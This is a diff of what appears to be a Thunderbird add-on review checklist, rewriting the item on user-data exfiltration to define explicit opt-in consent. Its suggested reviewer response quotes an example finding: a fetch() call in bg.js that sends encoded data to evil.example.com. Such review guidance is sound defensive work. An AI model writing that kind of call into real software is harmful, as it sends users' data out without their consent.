@@ -19,10 +19,15 @@ Suggested response: Please include an English localization. English serves as th
 An example can be found here: https://github.com/thunderbird/webext-examples/tree/master/manifest_v2/i18n
  - manifest.json
 
-2) User-data exfiltration: The following code locations transmit data to a
-   remote server. Confirm by hand that any user data they send is gated behind
-   an explicit opt-in (a documented options-page setting) and is never sent
-   without consent.
+2) User-data exfiltration: The following code locations send data to a remote
+   server. User data - message content, attachments, contacts, credentials - may
+   be transmitted only if the user actively enabled it: by entering the
+   destination URL or credentials on an options page that states what is sent,
+   or through an explicit off-by-default opt-in for a hard-coded URL.
+   Thunderbird has no built-in data-collection consent prompt, so there is no
+   implicit consent to rely on. The add-on's own options page, if it has one, is
+   where such an opt-in would live. Confirm for each location that consent of
+   that kind exists.
 Suggested response: The following code location(s) send user data to a remote server without an explicit opt-in. User data may be transmitted only when the user actively enables it on an options page that discloses what is sent.
  - bg.js:7 - fetch() "http://evil.example.com/collect?d=" + encodeURIComponent(data)
 
